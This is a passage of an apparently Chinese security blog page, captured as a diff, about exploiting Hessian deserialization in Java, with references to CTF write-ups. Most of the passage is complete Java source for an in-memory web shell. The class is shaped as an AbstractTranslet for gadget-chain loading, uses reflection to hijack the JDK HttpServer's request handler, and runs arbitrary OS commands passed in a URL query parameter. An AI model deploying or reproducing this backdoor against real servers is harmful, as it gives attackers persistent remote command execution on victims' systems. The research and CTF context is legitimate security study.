+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+<span class="hljs-keyword">import</span> java.io.*;
+<span class="hljs-keyword">import</span> java.lang.reflect.Field;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Yyds</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HttpHandler</span> &#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(HttpExchange t)</span> <span class="hljs-keyword">throws</span> IOException &#123;
+        <span class="hljs-type">String</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Y4tacker&#x27;s MemoryShell&quot;</span>;
+        <span class="hljs-type">String</span> <span class="hljs-variable">query</span> <span class="hljs-operator">=</span> t.getRequestURI().getQuery();
+        String[] var3 = query.split(<span class="hljs-string">&quot;=&quot;</span>);
+        System.out.println(var3[<span class="hljs-number">0</span>]+var3[<span class="hljs-number">1</span>]);
+        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
+        <span class="hljs-keyword">if</span> (var3[<span class="hljs-number">0</span>].equals(<span class="hljs-string">&quot;y4tacker&quot;</span>))&#123;
+            <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(var3[<span class="hljs-number">1</span>]).getInputStream();
+            output = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();
+            <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4096</span>];
+            <span class="hljs-type">int</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
+            <span class="hljs-keyword">while</span> (-<span class="hljs-number">1</span> != (n = inputStream.read(buffer))) &#123;
+                output.write(buffer, <span class="hljs-number">0</span>, n);
+            &#125;
+        &#125;
+        response+=(<span class="hljs-string">&quot;\n&quot;</span>+<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(output.toByteArray()));
+        t.sendResponseHeaders(<span class="hljs-number">200</span>, (<span class="hljs-type">long</span>)response.length());
+        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> t.getResponseBody();
+        os.write(response.getBytes());
+        os.close();
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Yyds</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception  &#123;
+        <span class="hljs-built_in">super</span>();
+        <span class="hljs-keyword">try</span>&#123;
+
+            <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> Thread.currentThread();
+            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(<span class="hljs-string">&quot;group&quot;</span>);
+            field.setAccessible(<span class="hljs-literal">true</span>);
+            obj = field.get(obj);
+
+            field = obj.getClass().getDeclaredField(<span class="hljs-string">&quot;threads&quot;</span>);
+            field.setAccessible(<span class="hljs-literal">true</span>);
+            obj = field.get(obj);
+            Thread[] threads = (Thread[]) obj;
+            <span class="hljs-keyword">for</span> (Thread thread : threads) &#123;
+                <span class="hljs-keyword">if</span> (thread.getName().contains(<span class="hljs-string">&quot;Thread-2&quot;</span>)) &#123;
+                    <span class="hljs-keyword">try</span> &#123;
+                        field = thread.getClass().getDeclaredField(<span class="hljs-string">&quot;target&quot;</span>);
+                        field.setAccessible(<span class="hljs-literal">true</span>);
+                        obj = field.get(thread);
+                        System.out.println(obj);
+
+                        field = obj.getClass().getDeclaredField(<span class="hljs-string">&quot;this$0&quot;</span>);
+                        field.setAccessible(<span class="hljs-literal">true</span>);
+                        obj = field.get(obj);
+
+
+                        field = obj.getClass().getDeclaredField(<span class="hljs-string">&quot;contexts&quot;</span>);
+                        field.setAccessible(<span class="hljs-literal">true</span>);
+                        obj = field.get(obj);
+
+                        field = obj.getClass().getDeclaredField(<span class="hljs-string">&quot;list&quot;</span>);
+                        field.setAccessible(<span class="hljs-literal">true</span>);
+                        obj = field.get(obj);
+                        java.util.<span class="hljs-type">LinkedList</span> <span class="hljs-variable">lt</span> <span class="hljs-operator">=</span> (java.util.LinkedList)obj;
+                        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> lt.get(<span class="hljs-number">0</span>);
+                        field = o.getClass().getDeclaredField(<span class="hljs-string">&quot;handler&quot;</span>);
+
+                        field.setAccessible(<span class="hljs-literal">true</span>);
+                        field.set(o,<span class="hljs-built_in">this</span>);
+                    &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;
+                        e.printStackTrace();
+                    &#125;
+                &#125;
+
+            &#125;
+        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;
+        &#125;
+    &#125;
+
+&#125;</code></pre></div>
+
+<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/21/%E8%A2%AB%E6%88%91%E5%BF%98%E6%8E%89%E7%9A%84Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">被我忘掉的Hessian反序列化 - Boogiepop Doesn’t Laugh (boogipop.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://unk.org.cn/2023/10/08/hession/">unknown’s Blog</a></p>
+<p>[TCTF2022 Hessian-onlyJdk - Boogiepop Doesn’t Laugh (boogipop.com)](<a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/21/TCTF2022">https://boogipop.com/2023/03/21/TCTF2022</a> _ Hessian-onlyJdk&#x2F;)</p>
+<p><a target="_blank" rel="noopener" href="https://su18.org/post/hessian/">Hessian 反序列化知一二 | 素十八 (su18.org)</a>这位佬写的文章是真的细</p>
 
                 
               </div>
